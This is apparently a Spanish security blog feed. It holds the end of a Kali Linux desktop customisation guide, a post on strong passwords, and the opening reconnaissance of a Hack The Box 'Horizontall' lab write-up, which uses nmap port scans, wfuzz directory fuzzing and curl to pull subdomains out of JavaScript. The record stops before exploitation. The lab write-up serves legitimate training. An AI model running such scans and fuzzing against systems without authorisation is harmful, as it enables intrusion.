y buscamos las instrucciones donde dice Manual y hay un comando que se los dejo igual:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone <span class="nt">--depth</span><span class="o">=</span>1 https://github.com/romkatv/powerlevel10k.git ~/powerlevel10k
<span class="nb">echo</span> <span class="s1">'source ~/powerlevel10k/powerlevel10k.zsh-theme'</span> <span class="o">&gt;&gt;</span>~/.zshrc
</code></pre></div></div>

<p>Esto hay que hacerlo tanto como usuario normal y como root. Una vez clonada procedemos a instalarla:
colocamos zsh y comenzamos a configurar a nuestro gusto.</p>

<h2 id="configurando-p10k">Configurando p10k</h2>

<p>Ahora retocamos alguna configuracion del archivo .p10k.zsh</p>

<p>Si queremos poner un icono diferente en la izquierda buscamos por esta linea que les dejo y colocamos el icono que queramos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">typeset</span> <span class="nt">-g</span> <span class="nv">POWERLEVEL9K_OS_ICON_CONTENT_EXPANSION</span><span class="o">=</span><span class="s1">''</span>
</code></pre></div></div>

<p>Hacemos la instalacion de la powerlevel10k para root:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone <span class="nt">--depth</span><span class="o">=</span>1 https://github.com/romkatv/powerlevel10k.git ~/powerlevel10k
<span class="nb">echo</span> <span class="s1">'source ~/powerlevel10k/powerlevel10k.zsh-theme'</span> <span class="o">&gt;&gt;</span>~/.zshrc
</code></pre></div></div>

<p>Modificamos el .p10k.zsh de root después de configurar la power level y hay una opción para que no nos ponga tanto texto cuando somos root, buscamos esta linea y borramos lo que esta entre comillas  simples:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">typeset</span> <span class="nt">-g</span> <span class="nv">POWERLEVEL9K_CONTEXT_PREFIX</span><span class="o">=</span><span class="s1">''</span>
</code></pre></div></div>

<p>Modificamos esta para poner un icono y saber cuando somos root en lugar de texto:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">typeset</span> <span class="nt">-g</span> <span class="nv">POWERLEVEL9K_CONTEXT_ROOT_TEMPLATE</span><span class="o">=</span><span class="s1">'icono'</span>
</code></pre></div></div>

<h2 id="enlace-simbólico-zshrc">Enlace simbólico zshrc</h2>

<p>Crearemos un enlace simbólico de la .zshrc para que sea la misma en root y usuario normal,, lo hacemos estando como root:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> <span class="nt">-f</span> /home/su usuario/.zshrc .zshrc
</code></pre></div></div>

<p>Hacemos un cambio en la .zshrc para que nos cargue la del usuario normal y no de problemas,, agregamos esto:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">source</span> /home/su usuario/powerlevel10k/powerlevel10k.zsh-theme
</code></pre></div></div>

<p>Modificamos algunas cosas del .zshrc en la opcion history configuration:
dejamos solo las primeras 3 opciones y aumentamos a 10000 los valores del histórico y agregamos estas líneas al final:
setopt histignorealldups sharehistory
Para que cuando mandemos una cadena vacía ejemplo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function </span><span class="nb">echo</span> <span class="s1">''</span> <span class="o">&gt;</span> ~/.zsh_history 
</code></pre></div></div>

<p>se borren los comandos que hayamos ejecutado antes.</p>

<p>Ahora quitaremos la negrita que nos aparece cuando navegamos por directorios en el lado izquierdo, lo haremos para root y usuario normal:
Modificamos el .p10k.zsh y filtramos por ANCHOR_BOLD y donde pone true colocamos false. Hacemos lo mismo para el usuario root</p>

<h2 id="instalando-batcat-y-lsd">Instalando batcat y lsd</h2>

<p>Descargamos batcat que es como un cat pero con esteroides, desde este repo y bajamos la versión más reciente:
<a href="https://github.com/sharkdp/bat/releases">Ver repositorio</a>
bat_0.24.0_amd64.deb</p>

<p>Descargamos lsd que es com un ls pero con esteroides, desde este repo y bajamos la versión más reciente:
<a href="https://github.com/lsd-rs/lsd/releases">Ver repositorio</a>
lsd_1.0.0_amd64.deb</p>

<p>Para instalarlos solo vamos a la carpeta donde decargamos y ponemos el siguiente comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpkg <span class="nt">-i</span> nombre_del_paquete
</code></pre></div></div>

<p>Instalamos locate:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>locate
</code></pre></div></div>

<p>Vamos a sincronizar todos los archivos del sistema para buscar lo que queremos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>updatedb
</code></pre></div></div>

<h2 id="instalando-fzf">Instalando fzf</h2>

<p>Ahora instalamos la fzf para hacer busquedas inteligentes en el sistema, desde el siguiente repo:</p>

<p><a href="https://github.com/junegunn/fzf">Ver repositorio</a></p>

<p>Para instalar lo hacemos como root y usuario normal en el home de cada uno:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone <span class="nt">--depth</span> 1 https://github.com/junegunn/fzf.git ~/.fzf
~/.fzf/install
</code></pre></div></div>

<h2 id="alias-para-bat-y-lsd">Alias para bat y lsd</h2>

<p>Ahora copiamos unos alias para nuestra .zshrc de bat y lsd:
<a href="https://pastebin.com/QGvVx3wG">Ver link</a></p>

<p>Tambien copiamos este archivo para que no nos salga en negrita a la hora de listar con lsd lo colocamos casi al final de la .zshrc:
<a href="https://pastes.io/xsqk9oi1hz">Ver link</a></p>

<p>Ahora vamos a arreglar un problema que da con burpsuite al estar en bspwm, agregamos estas líneas casi al principio de nuestro archivo, pero para que nos funcione burpsuite debemos correrlo desde la terminal no desde el shortcut del sxhkdrc ya que siempre presentara el problema:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Fix the Java Problem</span>
<span class="nb">export </span><span class="nv">_JAVA_AWT_WM_NONREPARENTING</span><span class="o">=</span>1
</code></pre></div></div>

<p>Tambien en el bspwmrc agregamos lo siguiente al final para arreglar el mismo problema:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmname LG3D &amp;
</code></pre></div></div>

<h2 id="creando-módulos-para-la-polybar">Creando módulos para la polybar</h2>

<p>Creamos unos módulos para la polybar para lo cual tenemos que crear una carpeta llamada bin en ~/.config:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>bin
</code></pre></div></div>

<p>Una vez creada aquí dentro pondremos los scripts que ocuparemos para cargar en los módulos de la polybar.</p>

<p>Para agregar un modulo tenemos que modificar el archivo current.ini y también el launch.sh, en el current.ini agregamos los módulos y en el launch.sh agregamos la ruta del modulo para que aparezca en la polybar.</p>

<p>Ejemplo de un modulo, este va casi al principio del current.ini donde esten los otros modulos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>bar/ethernet_bar]
inherit <span class="o">=</span> bar/main
width <span class="o">=</span> 10%
height <span class="o">=</span> 40
offset-x <span class="o">=</span> 11.1%
offset-y <span class="o">=</span> 15
bottom <span class="o">=</span> <span class="nb">false
</span>font-7 <span class="o">=</span> <span class="s2">"Hack Nerd Font Mono:size=22;5"</span>
foreground <span class="o">=</span> <span class="k">${</span><span class="nv">color</span><span class="p">.white</span><span class="k">}</span>
background <span class="o">=</span> <span class="k">${</span><span class="p">[color.bg](http</span>://color.bg/<span class="p">)</span><span class="k">}</span>
padding <span class="o">=</span> 1
modules-center <span class="o">=</span> ethernet_status
wm-restack <span class="o">=</span> bspwm
</code></pre></div></div>

<p>Este otro casi al final donde están los demás módulos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>module/ethernet_status]
<span class="nb">type</span> <span class="o">=</span> custom/script
interval <span class="o">=</span> 2
<span class="nb">exec</span> <span class="o">=</span> ~/.config/bin/ethernet_status.sh
</code></pre></div></div>

<p>Este seria el contenido de nuestro script para el ethernet_status en ~/.config/bin de la carpeta que creamos anteriormente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>

<span class="nb">echo</span> <span class="s2">"%{F#2495e7}󰈀 %{F#ffffff}</span><span class="si">$(</span>/usr/sbin/ifconfig eth0 | <span class="nb">grep</span> <span class="s2">"inet "</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span><span class="si">)</span><span class="s2">%{u-}"</span>
</code></pre></div></div>

<p>Luego en el launch.sh agregaremos esto para que nos cargue el modulo, El archivo tendrá los otros módulos que trae por default si no queremos que muestre uno solo comentamos:
Ejemplo launch.sh:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">## Left bar</span>

<span class="c">#polybar log -c ~/.config/polybar/current.ini &amp;</span>
polybar secondary <span class="nt">-c</span> ~/.config/polybar/current.ini &amp;
polybar ethernet_bar <span class="nt">-c</span> ~/.config/polybar/current.ini &amp;
</code></pre></div></div>

<h2 id="sudo-plugin">Sudo plugin</h2>

<p>Ahora instalaremos el sudo plugin, para hacer doble ESC nos ponga sudo antes.
para agregarlo nos dirigimos a /usr/share/ y aquí adentro crearemos una carpeta todo lo hacemos como root:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>zsh-sudo-plugin
</code></pre></div></div>

<p>nos metemos al directorio y luego descargamos el raw:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /zsh-sudo-plugin/
wget https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/sudo/sudo.plugin.zsh
</code></pre></div></div>

<p>Una vez descargado le asignamos permisos de ejecución:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x nombre de plugin
</code></pre></div></div>

<p>Y le asignan como propietario su usuario:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chown </span>usuario:usuario plugin
</code></pre></div></div>

<p>Agregamos este código a nuestra .zshrc:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">[</span> <span class="nt">-f</span> /usr/share/zsh-sudo-plugin/sudo.plugin.zsh <span class="o">]</span><span class="p">;</span> <span class="k">then
</span><span class="nb">source</span> /usr/share/zsh-sudo-plugin/sudo.plugin.zsh
<span class="k">fi</span>
</code></pre></div></div>

<p>Ahora modificamos la polybar para identificar que ventana esta activa, inactiva y vacia.
Modificaremos el workspace.ini de la polybar. Buscamos las siguientes líneas:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>label-active-foreground <span class="o">=</span> <span class="k">${</span><span class="nv">color</span><span class="p">.green</span><span class="k">}</span>
</code></pre></div></div>

<p>sustituimos el color de active y mas abajo esta la de ocupada, colocamos el color que mejor nos parezca.</p>

<h2 id="auto-completado-inteligente">Auto completado inteligente</h2>

<p>Instalamos un autocompletado inteligente en nuestro archivo de .zshrc, que esta en este link:
<a href="https://pastebin.com/H87J3nMj">Ver link</a>
Copiamos y pegamos lo del archivo en nuestra .zshrc, filtramos por completion features y borramos las que ya trae y pegamos las nuevas.</p>

<p>Ahora instalaremos npm para instalar neovim de neochad:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>npm
</code></pre></div></div>

<p>Procedemos a clonar el repositorio para tener nvim:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/NvChad/NvChad ~/.config/nvim <span class="nt">--depth</span> 1
</code></pre></div></div>

<p>Ahora entramos en esta url y buscamos el que pone nvim-linux64.tar.gz en esta url y lo descargamos:
<a href="https://github.com/neovim/neovim/releases">Ver link</a></p>

<p>Nos movemos al directorio opt, nos ponemos como root movemos y descomprimimos el archivo en ese directorio:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /opt
<span class="nb">sudo </span>su
<span class="nb">mv</span> /home/usuario/Downloads/nvim-linux64.tar.gz <span class="nb">.</span>
</code></pre></div></div>

<p>Borramos el comprimido y entramos en la carpeta de nvim, luego en bin y ejecutamos como usuario normal el nvim:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>nvim
<span class="nb">cd </span>bin
su usuario
./nvim
</code></pre></div></div>

<p>y se instalara todo correctamente.</p>

<p>Ahora modificamos nuestro archivo .zshrc y agregamos estas líneas en custom aliases:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#nvim</span>
<span class="nb">alias </span><span class="nv">nvim</span><span class="o">=</span><span class="s1">'/opt/nvim-linux64/bin/nvim'</span>
</code></pre></div></div>

<p>y con esto ya tendríamos nvim instalado, solo cerramos la ventana y abrimos una nueva para probar.</p>

<p>Ahora hacemos lo mismo para el usuario root, volvemos a hacer el git clone en el home de root:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/NvChad/NvChad ~/.config/nvim <span class="nt">--depth</span> 1
</code></pre></div></div>

<p>Ejecutamos nvim y se instalara todo correctamente.</p>

<h2 id="instalando-flameshot">Instalando flameshot</h2>

<p>Como opcional podemos instalar flameshot que sirve para hacer capturas de pantalla personalizadas.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>flameshot
</code></pre></div></div>

<h2 id="instalando-i3lock-y-i3lock-fancy">Instalando i3lock y i3lock-fancy</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>i3lock

</code></pre></div></div>

<p>Luego vamos a este github y vemos las instrucciones para instalar:
<a href="https://github.com/meskarune/i3lock-fancy">Ver link</a>
Primero nos dirigimos a Downloads y clonamos el repo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /home/usuario/Downloads
git clone https://github.com/meskarune/i3lock-fancy
</code></pre></div></div>

<p>Luego entramos al directorio y hacemos un sudo make install y listo.</p>

<p>Ejecutamos este comando para darle un texto y un tipo de fuente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>i3lock-fancy <span class="nt">-t</span> <span class="s2">"Introduce tu contraseña"</span> <span class="nt">-f</span> /usr/local/share/fonts/HackNerdFont-Regular.ttf
</code></pre></div></div>

<p>Con esto ya lo tendríamos.</p>

<p>Creamos un shortcut en en el sxhkdrc para activarlo con un atajo haciendo uso de la ruta absoluta:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/i3lock-fancy <span class="nt">-t</span> <span class="s2">"Introduce tu contraseña"</span> <span class="nt">-f</span> /usr/local/share/fonts/HackNerdFont-Regular.ttf
</code></pre></div></div>

<p>Después de esto reiniciamos el entorno para aplicar los cambios.</p>

<p>Listo con esto tenemos nuestro entorno listo para trabajar.</p>

<h2 id="happy-hacking">Happy hacking.</h2>]]></content><author><name>ewor01</name></author><category term="kali linux" /><category term="bspwm" /><category term="polybar" /><category term="kitty" /><category term="p10k" /><category term="zsh" /><category term="picom" /><category term="nvim" /><category term="entorno personalizado" /><category term="kali linux personalizado" /><summary type="html"><![CDATA[¿Te gustaría aprender sobre Cómo crear un entorno de trabajo personalizado?, pues vamos a ello.]]></summary></entry><entry><title type="html">¿Cómo crear una contraseña segura?</title><link href="http://localhost:4000/contrase%C3%B1as-seguras/" rel="alternate" type="text/html" title="¿Cómo crear una contraseña segura?" /><published>2023-02-13T00:00:00-06:00</published><updated>2023-02-13T00:00:00-06:00</updated><id>http://localhost:4000/contrase%C3%B1as-seguras</id><content type="html" xml:base="http://localhost:4000/contrase%C3%B1as-seguras/"><![CDATA[<p align="center">
<img src="/assets/images/contraseñas-seguras/contraseñas_seguras.png" />
</p>

<h2 id="cómo-crear-una-contraseña-segura">¿Cómo crear una contraseña segura?</h2>

<ul>
  <li>Cuanto más avanza Internet, más importante es proteger nuestra información personal.</li>
  <li>Hoy en día se comparte todo y nuestras fotos, documentos y conversaciones se guardan en la nube. Es la era de la información y estamos conectados todo el día, incluso desde varios dispositivos a la vez.</li>
  <li>Los avances son buenos porque nos facilitan la vida, pero también motivan a otras personas a invadir nuestra privacidad.</li>
  <li>Por eso es más fundamental que nunca que nos protejamos de ataques y robos de datos personales.</li>
</ul>

<p align="center">
<img src="/assets/images/contraseñas-seguras/securepass.png" />
</p>

<ul>
  <li>Imagina que no tienes una contraseña segura, alguien descubre la que has usado con el correo electrónico y accede a él. Ahora puede ver los correos que has recibido de tus amigos, del trabajo, del banco. ¿Parece peligroso? Pues lo es, y mucho.</li>
  <li>Con el acceso a tu correo puede acceder, por ejemplo, a tus redes sociales con solo solicitar recuperar la contraseña. Y no solo eso, también podría acceder a tu cuenta bancaria o cualquier otro sitio al que entres usando tu email.</li>
  <li>A la hora de elegir una contraseña es normal elegir palabras o números que nos resulten familiares y podamos recordar con facilidad. Por ejemplo, se usan mucho las contraseñas con fechas importantes como la de nuestro cumpleaños, la de nuestro hijo, la del aniversario, etc. Esto es un error más común de lo que nos imaginamos, porque es muy fácil de averiguar.</li>
</ul>

<p>Riesgos de no tener contraseñas seguras:</p>

<ul>
  <li>Existen miles de filtraciones de datos de grandes empresas donde podria estar tu contraseña.</li>
  <li>Ciberdelincuentes se hacen con los datos de las personas al adivinar sus contraseñas o atacarlas por medio de diccionarios o fuerza bruta.</li>
  <li>Contraseñas como “123456” siguen siendo usados por muchas personas en el mundo.</li>
  <li>Perder el acceso a todas tus cuentas, incluyendo el correo.</li>
</ul>

<p>Debido a que mucha gente decide crear contraseñas tan inseguras como “11111” o “asdf” vamos a analizar algunos trucos y métodos para crear una contraseña segura y que, además, podamos recordarla con facilidad:</p>

<ul>
  <li>Ya sea que usemos un generador de contraseña o no, debemos seguir ciertas pautas cada vez que se nos pida crear una contraseña a la hora de registrarnos en algún sitio web o red social.</li>
  <li>No uses nunca contraseñas que solo contengan letras como, por ejemplo, nombres personales, el nombre de tu usuario, familiares, mascotas, ciudades, etc.</li>
  <li>Tampoco utilices nunca contraseñas únicamente con números que estén relacionados con fechas importantes, direcciones, número de DNI, matrículas o cualquier otro elemento de nuestro entorno cercano que se pueda averiguar fácilmente.</li>
  <li>Como mínimo, mezcla letras y números elegidos aleatoriamente, que no tengan un orden lógico o deducible. Intercala letras minúsculas con mayúsculas,.</li>
  <li>La longitud mínima recomendada es de 12 caracteres, aunque si tiene más, mucho mejor.</li>
  <li>No compartas nunca tus contraseñas con nadie, porque ya no importará cuánto te hayas esforzado por crearla. En ese momento dejará de ser segura.</li>
  <li>Un error muy común es usar la misma clave para todo. No hagas eso, porque si algún día alguien la descubre, tendrá acceso a todas tus cuentas.</li>
  <li>Es muy recomendable cambiarlas cada cierto tiempo. Muchos sitios ya te obligan a hacer este cambio como, por ejemplo, los bancos online.</li>
  <li>Cuidado con las preguntas de seguridad. Si las utilizas, que sólo tú y nadie más sepa las respuestas.</li>
</ul>

<p>generadores de contraseñas:</p>

<p>Los generadores de contraseñas son programas que tienen un algoritmo para generar cadenas de números, letras y símbolos aleatorios con la longitud y características que les indiquemos. Son sencillos de usar y también los hay que permiten recordar y guardar las contraseñas de forma segura.</p>

<p align="center">
<img src="/assets/images/contraseñas-seguras/avastpassgen.png" />
</p>

<p>En esta imagen observamos un generador de contraseñas online, el cual es de avast. Te dejo el link por si te sirve de ayuda <a href="https://www.avast.com/es-ww/random-password-generator#pc">link</a></p>

<p>Gestores de contraseñas:</p>

<p>Existen muchos gestores de contraseñas, pero en este caso les recomendare 2 los cuales son bitwarden y keepass. Personalmente uso bitwarden es muy sencillo de usar y puedes tener acceso a todas tus contraseñas desde cualquier dispositivo. Keepass hay quienes lo ven mas seguro ya que tu creas la base de datos cifrada de las contraseñas a la cual solo tienes acceso localmente, todo es cuestión de gustos así que te animo a investigar sobre los gestores de contraseñas y escoge el que mejor se adapte a ti.</p>

<p align="center">
<img src="/assets/images/contraseñas-seguras/bitwarden.png" />
</p>

<p align="center">
<img src="/assets/images/contraseñas-seguras/keepass.png" />
</p>

<p>Vamos a ver algunas ventajas de usar un gestor de contraseñas:</p>

<ul>
  <li>Los gestores de contraseñas las almacenan en una base de datos cifrada. De esta forma están seguras bajo nuestro control.</li>
  <li>Otra ventaja principal es que solo tenemos que preocuparnos de generar y recordar la contraseña de acceso a nuestro gestor de contraseñas. Una vez dentro, ya podemos usar el resto sin necesidad de memorizarlas y pudiendo generarlas de forma segura.</li>
  <li>Un buen gestor de contraseñas debe permitir su uso en diferentes plataformas y dispositivos. De esta forma, podremos usarlos cuando usemos el portátil, la tablet o el teléfono</li>
</ul>

<p>Tambien podemos comprobar que tan seguras son nuestras contraseñas con la siguiente herramienta online proporcionada por Karspersky, la cual es muy sencilla de utilizar basta con ir a la web la cual te dejo por aquí <a href="https://password.kaspersky.com/es/">link</a> solo colocas la contraseña a comprobar y obtendras el resultado de que tan seguras son tus contraseñas.</p>

<p><strong>Con esto concluimos el post espero les sirva de ayuda y nos vemos en el siguiente, ayúdame compartiendo mi sitio con tus amigos, gracias.</strong></p>]]></content><author><name>ewor01</name></author><category term="password" /><category term="secure" /><category term="contraseñas seguras" /><summary type="html"><![CDATA[¿Te gustaría aprender sobre Cómo crear contraseñas seguras y hacer un uso adecuado de estas?, vamos a ello.]]></summary></entry><entry><title type="html">Horizontall - Hack The Box</title><link href="http://localhost:4000/horizontall-hackthebox/" rel="alternate" type="text/html" title="Horizontall - Hack The Box" /><published>2023-02-05T00:00:00-06:00</published><updated>2023-02-05T00:00:00-06:00</updated><id>http://localhost:4000/horizontall-hackthebox</id><content type="html" xml:base="http://localhost:4000/horizontall-hackthebox/"><![CDATA[<p>Certificaciones a aplicar: eJPT, eWPT</p>

<p>Dificultad: Fácil</p>

<p>Habilidades:</p>

<ul>
  <li>Information Leakage</li>
  <li>Port Forwarding</li>
  <li>Strapi CMS Exploitation</li>
  <li>Laravel Exploitation</li>
</ul>

<p><img src="/assets/images/htb-writeup-horizontall/Horizontall.png" alt="Captura de pantalla (62).png" /></p>

<h1 id="ip-de-la-maquina">IP de la Maquina</h1>

<p>10.10.11.105</p>

<h1 id="reconocimiento">Reconocimiento</h1>

<p>Identificando el sistema operativo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whichSystem.py 10.10.11.105
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-17-57-12.png" alt="Hackforce-2022-12-11-17-57-12.png" /></p>

<p>Escaneo de los puertos y guardamos en formato grep en el ficherito allPorts.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.105 <span class="nt">-oG</span> allPorts
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-17-56-15.png" alt="Hackforce-2022-12-11-17-56-15.png" /></p>

<p>Función extractPorts.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extractPorts allPorts
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-00-00.png" alt="Hackforce-2022-12-11-18-00-00.png" /></p>

<h1 id="análisis-de-vulnerabilidades">Análisis de Vulnerabilidades</h1>

<p>Buscando versiones y servicios que corren para esos puertos y lo guardamos en formato nmap en el ficherito targeted.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.11.105 <span class="nt">-oN</span> targeted
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-01-23.png" alt="Hackforce-2022-12-11-18-01-23.png" /></p>

<p>Vamos a identificar ante que nos estamos enfrentando de la siguiente manera colocamos en el navegador launchpad 4ubuntu0.5 y nos dara el siguiente resultado.</p>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-07-31.png" alt="Hackforce-2022-12-11-18-07-31.png" /></p>

<p>De esta manera vemos que estamos ante un Ubuntu Bionic.</p>

<p>Luego vemos que nmap nos reporta que hay un follow redirect hacia <a href="http://horizontall.htb/">http://horizontall.htb</a> entonces verificamos con whatweb y debería mostrar lo mismo.</p>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-11-03.png" alt="Hackforce-2022-12-11-18-11-03.png" /></p>

<p>En efecto vemos que nos muestra lo mismo, si colocamos esa dirección en el navegador nos dará error ya que se esta aplicando virtual hosting.</p>

<p>Para agregarla editamos el fichero que esta /etc/hosts de la siguiente manera.</p>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-16-41.png" alt="Hackforce-2022-12-11-18-16-41.png" /></p>

<p>Con esto ya tendria que resolvernos el dominio en la ip privada y para comprobar emitimos un ping hacia el dominio.</p>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-18-08.png" alt="Hackforce-2022-12-11-18-18-08.png" /></p>

<p>Luego vamos a aplicar el script http-enum de nmap al dominio agregado y lo guardamos en formato nmap y lo exportamos en el ficherito webScan.</p>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-18-23-25.png" alt="Hackforce-2022-12-11-18-23-25.png" /></p>

<p>Si no nos encontro nada como es el caso borramos el ficherito.</p>

<p>Vamos a hacer Fuzzing con wfuzz</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 200 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://horizontall.htb/FUZZ
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-09-04.png" alt="Hackforce-2022-12-11-23-09-04.png" /></p>

<p>Nos encontró 3 directorios los analizamos y miramos si hay algo si no inspeccionaremos el código fuente de la pagina a ver si hay alguna pista.</p>

<p>Lanzamos un Curl al sitio haciendo una petición GET.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://horizontall.htb/"</span> | htmlq <span class="nt">-p</span> | <span class="nb">cat</span> <span class="nt">-l</span> html
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-19-45.png" alt="Hackforce-2022-12-11-23-19-45.png" /></p>

<p>Nos lo mostrara asi para inspeccionar mejor el código y vemos algo medio intersante haciendo referencia a unos archivos java script.</p>

<p>Vamos a utilizar unas expresiones regulares con grep para filtrar por lo que nos interesa.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://horizontall.htb/"</span> | htmlq <span class="nt">-p</span> | <span class="nb">cat</span> <span class="nt">-l</span> html | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'".*?"'</span> | <span class="nb">grep </span>app<span class="se">\.</span> | <span class="nb">sort</span> <span class="nt">-u</span>
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-30-41.png" alt="Hackforce-2022-12-11-23-30-41.png" /></p>

<p>Observamos dos rutas, la de css no es de tanto interes asi que vamos a mirar la de js.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://horizontall.htb/js/app.c68eb462.js"</span>
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-33-15.png" alt="Hackforce-2022-12-11-23-33-15.png" /></p>

<p>Vemos lo siguiente, no miramos nada así que vamos a filtrar para ver si logramos obtener algo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://horizontall.htb/js/app.c68eb462.js"</span> | <span class="nb">grep</span> <span class="s2">"</span><span class="se">\.</span><span class="s2">htb"</span>
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-38-34.png" alt="Hackforce-2022-12-11-23-38-34.png" /></p>

<p>Vemos algo interesante así que vamos a crear una expresión regular una vez mas y que nos filtre por http.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s2">"http://horizontall.htb/js/app.c68eb462.js"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'".*?"'</span> | <span class="nb">grep </span>http |  <span class="nb">sort</span> <span class="nt">-u</span>
</code></pre></div></div>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-42-50.png" alt="Hackforce-2022-12-11-23-42-50.png" /></p>

<p>Ahi tenemos lo que nos interesa así que vamos a verlo en el navegador, pero antes tenemos que agregarlo al /etc/hosts.</p>

<p><img src="/assets/images/htb-writeup-horizontall/Hackforce-2022-12-11-23-45-13.png" alt="Hackforce-2022-12-11-23-45-13.png" /></p>

<p>Ahora lo miramos en el navegador y vemos con wappalyzer que tecnologias posee.</p>

